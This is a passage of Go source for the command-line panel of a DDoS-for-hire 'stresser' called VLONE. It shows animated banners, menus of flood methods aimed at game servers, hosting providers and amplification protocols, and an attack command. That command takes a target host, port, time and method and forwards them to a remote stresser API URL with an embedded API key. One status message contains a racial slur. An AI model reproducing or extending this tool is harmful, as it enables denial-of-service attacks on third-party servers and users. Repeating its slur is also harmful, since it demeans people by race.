            this.conn.Write([]byte("\x1b[36m                            ╚═══════════\x1b[35m═══════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                            ╚═══╦═══════\x1b[35m═══════╦═══╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                                ║  -----\x1b[35m-----  ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                                ╚═══════\x1b[35m═══════╝\r\n"))

    continue

		}

        if err != nil || cmd == "stats" || cmd == "STATS" {// @xGkun// @xGkun// @xGkun// @xGkun
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                                       
            this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                                       
            this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Proxy     > \x1b[32mONLINE                  \x1b[36m║\r\n"))                                                           
            this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[36m ╔══════════════════════════════════════╗\r\n"))                  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 4   > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Layer 7   > \x1b[32mONLINE                  \x1b[36m║\r\n"))
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Proxy     > \x1b[32mONLINE                  \x1b[36m║\r\n"))  
            this.conn.Write([]byte("\x1b[36m ║\x1b[35m  Servers   > 14                      \x1b[36m║\r\n"))                                                          
            this.conn.Write([]byte("\x1b[36m ╚══════════════════════════════════════╝\r\n"))// @xGkun// @xGkun// @xGkun// @xGkun
            continue
       }
		
        if err != nil || cmd == "exit" || cmd == "quit" {
            return
        }
        
        if cmd == "" {
            continue
        }
        if err != nil || cmd == "l7" || cmd == "L7" || cmd =="layer7" || cmd == "LAYER7" {
            this.conn.Write([]byte("\033[36m╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             Layer 7             \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║═════════════════════════════════╣\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           HTTP-GET              \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           HTTP-POST             \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           HTTP-BYPASS           \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╚═════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "games" || cmd == "GAMES" {
            this.conn.Write([]byte("\033[36m╔═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m              Games              \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║═════════════════════════════════╣\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m  ROBLOX                 FORTNITE\033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m  COD                    2K      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m  RUST                   XXXXXXXX\033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╚═════════════════════════════════╝\r\n"))
            continue
        }
        if err != nil || cmd == "l4" || cmd == "L4" || cmd =="layer4" || cmd == "LAYER4" || cmd == "normal" || cmd == "NORMAL" {
            this.conn.Write([]byte("\033[36m╔══════════════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m               Layer 4 / Other            \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╠══════════════════════════════════════════╣\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m LDAP              TCPBYPASS   DVR        \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m OVH-UDP           NFO-UDP     NFO-RIOT   \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m OVH-TCP           NFO-TCP     TEAMS      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m UDP-DROP          CHOOPA      ZOOM       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m CHOOPA            RED-SYN     HYDRA      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m WSD               PLEX        XACK       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m IPSEC             SNMP        DNS        \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m ARD               TORRENT     NFO-NAT    \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m XSYN              SYN-ACK     XACK       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m TCPRAND           STOMP       RAW        \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m OVH-AMP           TEAMS       OVH-GAME   \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m FORTNITE          ARK255      RUST       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m R6-LAG            FIVEM       COD        \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m ARKLIFT           AMONGUS     2K         \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╚══════════════════════════════════════════╝\r\n"))
            continue
        }
          if err != nil || cmd == "attack" || cmd == "ATTACK" {
            /*this.conn.Write([]byte("\033[36m╔═════════════════════════════════╦═════════════════════════════════╗\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             Games               \033[36m║\033[35m          Layer 4 / Other        \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╠═════════════════════════════════╬═════════════════════════════════╣\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           UNTURNED              \033[36m║\033[35m  TCPBYPASS            IPSEC     \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           FORTNITE              \033[36m║\033[35m  OVHGAME              SNMP      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           FREEFIRE              \033[36m║\033[35m  CHOOPA               LDAP      \033[36m║\r\n")) 
            this.conn.Write([]byte("\033[36m║\033[35m           AMONGUS               \033[36m║\033[35m  OVHUDP               WSD       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           WARFACE               \033[36m║\033[35m  OVHTCP               DNS       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m           ARKLIFT               \033[36m║\033[35m  NFOTCP               BITTORRENT\033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            ROBLOX               \033[36m║\033[35m  NFOUDP               SOURCE    \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            R6RANK               \033[36m║\033[35m  HYDRA                HOME      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            FIVEM                \033[36m║\033[35m  CHOOPA               LDAP      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             RUST                \033[36m║\033[35m  ACK                  SYN69     \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             CSGO                \033[36m║\033[35m  OVHTCP               DNS       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             PUBG                \033[36m║\033[35m  HEX                  SYN       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m             COD                 \033[36m║\033[35m  TCPRAND              SYNACK    \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m              2K                 \033[36m║\033[35m  ZOOM                 ARD       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╠═════════════════════════════════╣\033[35m  TEAMS                DVR       \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m              Layer 7            \033[36m║\033[35m  TCPRAND              SYNACK    \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║═════════════════════════════════╣\033[35m  STOMP                REDSYN    ║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            HTTPGET              \033[36m║\033[35m  RAW                  XSYN      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            HTTPCONN             \033[36m║\033[35m  STD                  XACK      \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m║\033[35m            HTTPBYPASS           \033[36m║\033[35m  VSE                  UDPBYPASS \033[36m║\r\n"))
            this.conn.Write([]byte("\033[36m╚═════════════════════════════════╩═════════════════════════════════╝\r\n"))
           // this.conn.Write([]byte("\033[36m                ╔═════════════════╩═══════════════╣\r\n"))
           // this.conn.Write([]byte("\033[36m                ║\033[35m             Layer 7            \033[36m║\r\n"))
           // this.conn.Write([]byte("\033[36m                ║═════════════════════════════════╣\r\n"))
           // this.conn.Write([]byte("\033[36m                ║\033[35m           HTTPGET              \033[36m║\r\n"))
           // this.conn.Write([]byte("\033[36m                ║\033[35m          HTTPCONN              \033[36m║\r\n"))
           // this.conn.Write([]byte("\033[36m                ║\033[35m           HTTPBYPASS           \033[36m║\r\n")) 
           // this.conn.Write([]byte("\033[36m                ╚═════════════════════════════════╝\r\n"))
           */
            this.conn.Write([]byte(""))
            this.conn.Write([]byte(""))
            this.conn.Write([]byte("\033[37mHost: \x1b[0m"))
            locipaddress, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37mPort: \x1b[0m"))
            port, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37mTime: \x1b[0m"))
            timee, err := this.ReadLine(false)
            this.conn.Write([]byte("\033[37mMethod:\x1b[0m"))
            method, err := this.ReadLine(false)
            if err != nil {
                return
            }
            url := "https://relevantapi.xyz/stresser/api/api.php?key=hcvOvlH2SZYzJmKS&host=" + locipaddress + "&port=" + port + "&time=" + timee + "&method=" + method + ""// @xGkun// @xGkun// @xGkun
            tr := &http.Transport{
                ResponseHeaderTimeout: 5 * time.Second,
                DisableCompression:    true,
            }
            client := &http.Client{Transport: tr, Timeout: 5 * time.Second}// @xGkun// @xGkun
            locresponse, err := client.Get(url)
            if err != nil {
                //loguri
                username123 := "User: " + username +"\r\n"
                ipatacat := "IP: " + locipaddress +"\r\n"
                portatacat := "Port: " + port +"\r\n"
                timpul := "Time: " + timee +"\r\n"
                metoda := "Method: " + method +"\r\n"
                sdasda := "=================================\r\n"
                fmt.Println(username123)
                fmt.Println(ipatacat)
                fmt.Println(portatacat)
                fmt.Println(timpul)
                fmt.Println(metoda)
                fmt.Println(sdasda)
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m                    ╚═══════════════════\x1b[35m══════════════════╝\r\n"))// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                            ╚═══════════\x1b[35m═══════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                            ╚═══╦═══════\x1b[35m═══════╦═══╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                                ║  -----\x1b[35m-----  ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                                ╚═══════\x1b[35m═══════╝\r\n"))
            this.conn.Write([]byte("\033[0m\r\n"))
            this.conn.Write([]byte(fmt.Sprintf("\x1b[37mNigger has been killed.\x1b[37m\r\n")))
                continue
            }
            locresponsedata, err := ioutil.ReadAll(locresponse.Body)
            if err != nil {
                this.conn.Write([]byte(fmt.Sprintf(" \033[37mFailed, Attack Failed To Send!\033[0m\r\n")))
                continue// @xGkun// @xGkun
            }
            locrespstring := string(locresponsedata)
            locformatted := strings.Replace(locrespstring, "\n", "\r\n", -1)
            //loguri
            username123 := "User: " + username +"\r\n"
            ipatacat := "IP: " + locipaddress +"\r\n"
            portatacat := "Port: " + port +"\r\n"
            timpul := "Time: " + timee +"\r\n"
            metoda := "Method: " + method +"\r\n"
            sdasda := "=================================\r\n"
            fmt.Println(username123)
            fmt.Println(ipatacat)
            fmt.Println(portatacat)
            fmt.Println(timpul)
            fmt.Println(metoda)
            fmt.Println(sdasda)
            //loguri
            this.conn.Write([]byte("\x1b[37m API Server Result\033[37m: \r\n\033[37m" + locformatted + "\x1b[0m\r\n"))
            this.conn.Write([]byte("\033[2J\033[1H")) //header
            this.conn.Write([]byte("\x1b[b[35m                            ╦  ╦ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ \r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ \r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ \r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m                    ╚═══════════════════\x1b[35m══════════════════╝\r\n"))// @xGkun
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════════════════\x1b[35m═══════════════════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
            this.conn.Write([]byte("\x1b[36m               ╚════╦═══════════════════\x1b[35m══════════════════╦════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                    ║            Version\x1b[35m v1.0             ║     \r\n"))  // @xGkun         
            this.conn.Write([]byte("\x1b[36m               ╔════╩═══════════════════\x1b[35m══════════════════╩════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆        Type [?] To \x1b[35mSee Commands         ☆  ║\r\n"))            
            this.conn.Write([]byte("\x1b[36m               ╚════════════╦═══════════\x1b[35m═══════════╦═══════════╝\r\n"))
            this.conn.Write([]byte("\x1b[36m                            ║discord.gg/\x1b[35mGjvmqs7Pxk ║\r\n"))// @xGkun// @xGkun
            this.conn.Write([]byte("\x1b[36m                            ╚═══════════\x1b[35m═══════════╝\r\n"))
            time.Sleep(500 * time.Millisecond)
            this.conn.Write([]byte("\033[2J\033[1;1H"))
            this.conn.Write([]byte("\x1b[35m                              ╦  ╦ ╦   ╔═╗ ╔╗╔ ╔═╗\r\n"))
            this.conn.Write([]byte("\x1b[35m                              ╚╗╔╝ ║   ║ ║ ║║║ ║╣\r\n"))
            this.conn.Write([]byte("\x1b[35m                               ╚╝  ╩═╝ ╚═╝ ╝╚╝ ╚═╝\r\n"))
            this.conn.Write([]byte("\x1b[36m               ╔════════════════════════\x1b[35m═══════════════════════╗\r\n"))// @xGkun
            this.conn.Write([]byte("\x1b[36m               ║  ☆            Welcome \x1b[35mTo VLONE.            ☆  ║\r\n"))  // @xGkun          
